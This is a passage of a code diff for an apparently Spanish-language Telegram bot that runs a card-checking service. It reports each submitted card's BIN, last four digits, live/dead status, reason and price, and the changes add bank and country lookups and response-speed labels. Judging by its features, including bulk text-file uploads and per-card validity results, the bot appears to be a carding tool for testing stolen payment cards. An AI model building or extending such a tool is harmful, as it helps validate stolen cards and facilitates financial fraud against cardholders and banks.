                 f"━━━━━━━━━━━━━━━━━━\n\n"
                 f"💳 Card: `{result.job.card_data['bin']}xxxxxx{result.job.card_data['last4']}`\n"
                 f"📊 Status: {emoji} `{result.status.value.upper()}` {confidence_text}\n"
                 f"📝 Reason: {result.reason}\n"
-                f"⚡ Time: `{result.response_time:.2f}s`\n"
+                f"{speed_icon} Time: `{result.response_time:.2f}s` ({result.speed_category})\n"
             )
             
             if result.price != "N/A":
                 response += f"💰 Price: `{result.price}`\n"
+            
+            # Añadir info de BIN
+            response += f"\n🏦 Bank: {result.bin_info.get('bank', 'Unknown')}\n"
+            response += f"🌍 Country: {result.bin_info.get('country', 'UN')}"
             
             keyboard = [[InlineKeyboardButton("🔙 Back to Check", callback_data="menu_check")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -2345,7 +2441,7 @@ async def post_init(application: Application):
     user_manager = UserManager(db)
     card_service = CardCheckService(db, user_manager)
     
-    logger.info("✅ Bot inicializado con timeouts completos y BIN compartido")
+    logger.info("✅ Bot inicializado con timeouts inteligentes")
 
 def main():
     app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
@@ -2360,7 +2456,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado sin timeouts fantasma")
+    logger.info("🚀 Bot iniciado con timeouts inteligentes")
     app.run_polling()
 
 if __name__ == "__main__":
